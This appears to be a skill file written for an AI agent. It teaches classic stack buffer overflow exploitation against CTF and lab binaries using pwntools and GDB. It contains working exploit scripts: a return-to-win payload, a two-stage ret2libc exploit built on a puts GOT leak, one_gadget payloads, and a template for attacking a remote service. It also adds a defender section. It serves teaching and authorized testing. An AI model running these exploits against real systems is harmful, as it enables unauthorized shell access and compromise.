---
name: pwn-fundamentals
description: Use when you need to exploit a classic stack buffer overflow on
  an authorized target, such as a CTF pwn challenge or a lab binary you have
  permission to test. Covers binary triage with checksec, finding the crash
  offset with cyclic patterns, hijacking control flow to a win function,
  leaking addresses to defeat ASLR, building a ret2libc exploit, and using
  one_gadget shortcuts, all with pwntools 4.13 and GDB 15.x. Use when a
  binary reads attacker-controlled input into a fixed-size stack buffer, or
  when you are learning binary exploitation from the ground up.
version: 1.0.0
domain: binary
lifecycle: stable
last_verified: 2026-10-23
requires: []
extends: []
relates: [ghidra-basics, shellcode-basics, format-strings, rop-chains]
tools:
  - name: pwntools
    version: 4.13
  - name: GDB
    version: 15.x
  - name: Python
    version: 3.12
  - name: gcc
    version: 14.x
---

Binary exploitation starts with the stack buffer overflow: a program reads
more input than its buffer holds, overwrites the saved return address, and
hands control of execution to the attacker. This skill teaches the full
authorized workflow for that classic bug class, from triage through a
working ret2libc exploit, using pwntools and GDB. Deeper techniques have
their own skills: ROP chains (rop-chains), handwritten shellcode
(shellcode-basics), format string bugs (format-strings), and heap bugs
(heap-exploitation). All exploitation targets binaries you have written
permission to test, such as CTF challenges, lab VMs, or client software in
scope.

## Quick Workflow

1. Triage the binary: architecture, protections (checksec), and the input
   path that overflows.
2. Find the exact offset from input start to the saved return address with
   a cyclic pattern.
3. Confirm control of the instruction pointer by crashing with the pattern
   and reading the fault address.
4. If a win function exists (calls system with /bin/sh), overwrite the
   return address with its address.
5. If not, leak a libc address at runtime to defeat ASLR, compute libc
   base, and return into system.
6. Stabilize the exploit: handle bad characters, alignment, and remote
   vs local differences.
7. Verify the exploit works repeatedly and against the remote service,
   not just locally.

## 1. Triage the binary

```bash
# Protections: NX, PIE, canary, RELRO decide the exploit strategy
checksec --file=./vuln

# Example output to read:
# Arch: amd64, RELRO: Partial, Stack: No canary, NX: Enabled, PIE: No PIE
```

Read the output like a plan:

- No canary: you can overwrite the saved return address directly.
- No PIE: binary addresses are fixed, gadgets and win functions are at
  known addresses.
- NX enabled: the stack is not executable, so you must reuse existing
  code (ret2libc) instead of running injected shellcode.
- Partial RELRO: the GOT is writable, useful for format string or GOT
  overwrite follow-ups.

Find the vulnerable input path. Use the ghidra-basics skill or a quick
strings pass to locate `gets`, `strcpy`, `scanf`, or `read` into a small
stack buffer.

```bash
# Build a practice binary with protections off to learn the basics
gcc -fno-stack-protector -no-pie -o vuln_practice vuln.c
checksec --file=./vuln_practice
```

## 2. Find the offset with a cyclic pattern

pwntools generates a unique pattern where every 4 or 8 byte substring is
distinct, so the crash address tells you the exact offset.

```bash
# Generate a 200 byte pattern and feed it to the binary
python3 -c "from pwn import *; print(cyclic(200).decode())" > /tmp/pattern.txt
./vuln < /tmp/pattern.txt
# The program crashes; note the fault address from the segfault message
# or from GDB: info registers rip
```

```bash
# In GDB, run with the pattern and read the crash address
gdb -q ./vuln
# (gdb) run < /tmp/pattern.txt
# Program received signal SIGSEGV ... rip 0x6161616c6261616b ...
# (gdb) quit

# Convert the fault address back to an offset
python3 -c "from pwn import *; print(cyclic_find(0x6161616c6261616b))"
# Output example: 72
```

On 64-bit, the fault address in RIP is 8 bytes of the pattern. Copy it
exactly, including endianness as shown. If the program crashes reading
input rather than returning, the offset is to a different register;
check which register holds pattern bytes and adjust.

A faster loop that does this automatically:

```python
#!/usr/bin/env python3
from pwn import *
p = process('./vuln')
p.sendline(cyclic(200))
p.wait()
core = p.corefile
offset = cyclic_find(core.read(core.rsp, 8))
print("offset:", offset)
```

## 3. Hijack control flow to a win function

The simplest exploit: the binary has a function that spawns a shell, and
you overwrite the return address with its address.

```bash
# Find the win function address (no PIE, so it is fixed)
nm ./vuln | grep -i win
# or: objdump -d ./vuln | grep -A2 '<win>'
```

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF('./vuln')
OFFSET = 72  # from the cyclic pattern step
WIN = exe.symbols['win']  # address of the win function

p = process('./vuln')
payload = b'A' * OFFSET
payload += p64(WIN)
p.sendline(payload)
p.interactive()
```

If `win` takes no arguments and just calls `system("/bin/sh")`, this is
enough. Test locally first, then point the same script at the remote
service by replacing `process` with `remote('host', port)`.

Stack alignment matters on 64-bit: if the exploit crashes inside
`system` with a `movaps` fault, add a single `ret` gadget before the win
address to fix 16-byte alignment.

```python
rop = ROP(exe)
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(WIN)
```

## 4. Leak an address to defeat ASLR

When the binary has no win function and ASLR randomizes libc, leak a
real libc address at runtime, compute the libc base, then call system.

The classic leak uses the PLT: call `puts` on a GOT entry, which prints
the resolved libc address of that function.

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # match the REMOTE libc
OFFSET = 72

rop = ROP(exe)
# Build: puts(puts@got) then return to main for a second stage
payload = b'A' * OFFSET
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(exe.symbols['main'])

p = process('./vuln')
p.sendline(payload)
p.recvline()  # consume any prompt output
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
print("puts leak:", hex(leak))

libc.address = leak - libc.symbols['puts']
print("libc base:", hex(libc.address))
```

Then the second stage calls `system("/bin/sh")`:

```python
payload2 = b'A' * OFFSET
payload2 += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload2 += p64(next(libc.search(b'/bin/sh')))
payload2 += p64(rop.find_gadget(['ret'])[0])  # stack alignment
payload2 += p64(libc.symbols['system'])
p.sendline(payload2)
p.interactive()
```

Critical detail: the libc on your machine is almost never the remote
libc. Download the remote libc (CTF platforms provide it) and use that
file for offset math, or the computed `system` address will be wrong.

## 5. one_gadget shortcut

When conditions allow, a single address in libc spawns a shell with no
argument setup. The one_gadget tool finds these addresses and their
constraints (for example, specific registers must be zero).

```bash
# Find one_gadgets in the target libc
one_gadget /lib/x86_64-linux-gnu/libc.so.6
# Output: 0xebc81 execve("/bin/sh", rbp-0x50, ...) with constraints [...]
```

```python
# Replace the system call with the gadget address
ONE_GADGET = 0xebc81
payload2 = b'A' * OFFSET
payload2 += p64(libc.address + ONE_GADGET)
p.sendline(payload2)
p.interactive()
```

Check the constraints in GDB before relying on a gadget: break at the
gadget address, inspect the required registers, and pick a gadget whose
constraints your exploit state satisfies. The first gadget in the list
is not always the usable one.

## 6. Stabilize for remote

Local success does not guarantee remote success. Common gaps:

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF('./vuln')
libc = ELF('./libc.so.6')  # the REMOTE libc file
context.binary = exe

# Test locally, then flip one line for remote
p = process('./vuln')
# p = remote('challenge.example', 1337)

# Always consume the prompt before sending the payload
p.recvuntil(b'input: ')
# ...
```

Rules for remote reliability:

- Match the remote libc exactly. Even a patch-level difference shifts
  offsets.
- Handle timing: add `p.recvuntil()` for every prompt, and use generous
  timeouts on slow networks.
- Check for bad characters: if the input goes through `strcpy`, a
  `\x00` byte truncates your payload. Test each address for null bytes
  and pick alternatives.
- Run the exploit in a loop (10 tries) during development. If it
  works 3 out of 10, something is uninitialized or racy; investigate
  before calling it done.

## Edge cases

- A stack canary is present. The classic overflow dies at the canary
  check. You need a leak of the canary value first (format string bug
  is the usual partner) or a different bug class entirely.
- PIE is enabled. Binary addresses randomize, so hardcoded win
  function addresses fail. Leak a binary address first (same puts
  technique on a binary GOT entry, or a format string leak), compute
  the binary base, then proceed.
- Full RELRO plus no useful PLT entries. The puts leak still works
  because it only reads the GOT; it does not write it.
- The input function is `fgets` with a size limit smaller than your
  payload. You cannot overflow in one write; look for multiple reads,
  a second input path, or an integer bug in the size calculation.
- The crash offset differs between local and remote. Different
  compiler versions or environment variables shift the stack. Do the
  cyclic offset discovery against the remote service if it echoes
  crashes, or make the offset a variable you tune per target.
- `system` is not in the binary's imports and libc has no `/bin/sh`
  string in the expected place. Search the provided libc for the
  string, and if truly absent, use `execve` via ROP (see rop-chains)
  or a one_gadget.

## Escalation

- No win function and no PLT leak primitive: use a format string
  vulnerability to leak addresses (format-strings skill), or pivot to
  ROP with gadgets from the binary itself (rop-chains skill).
- The overflow is on the heap, not the stack: this skill does not
  apply. Switch to heap-exploitation.
- NX is disabled (rare on modern systems): you can jump to shellcode
  on the stack. See shellcode-basics for building it, and remember
  this almost never happens on current distributions.
- The service forks per connection: brute-forcing a canary byte by
  byte becomes possible since only the child crashes. This is slow
  but reliable on forking network services.
- Everything fails and the binary is small: re-examine it in Ghidra.
  Many CTF binaries hide a second vulnerability (an integer overflow
  on the read size, a use-after-free) that is easier than fighting
  the stack protections.

## Detection and defender view

Defenders detect exploitation attempts through crash monitoring
(repeated SIGSEGV from one source), IDS signatures for long
non-printable input, and canary or fortify failures in application
logs. The durable fixes are compiling with stack canaries, PIE, and
NX (all on by default in modern toolchains), replacing unsafe input
functions (`gets`, unbounded `strcpy`) with bounded versions, and
fuzzing the input parsers before release. For incident responders, a
crash loop against a network service followed by a successful
connection is the signature of an exploit being developed and then
landing.

## Key references

- CWE-121 (Stack-based Buffer Overflow).
- CWE-122 (Heap-based Buffer Overflow): the sibling class, covered in
  heap-exploitation.
- CWE-787 (Out-of-bounds Write): the modern parent category.
- CWE-120 (Buffer Copy without Checking Size of Input).
- MITRE ATT&CK T1068 (Exploitation for Privilege Escalation): when the
  target is a setuid binary.
- pwntools documentation: https://docs.pwntools.com/
- GDB documentation: https://sourceware.org/gdb/documentation/
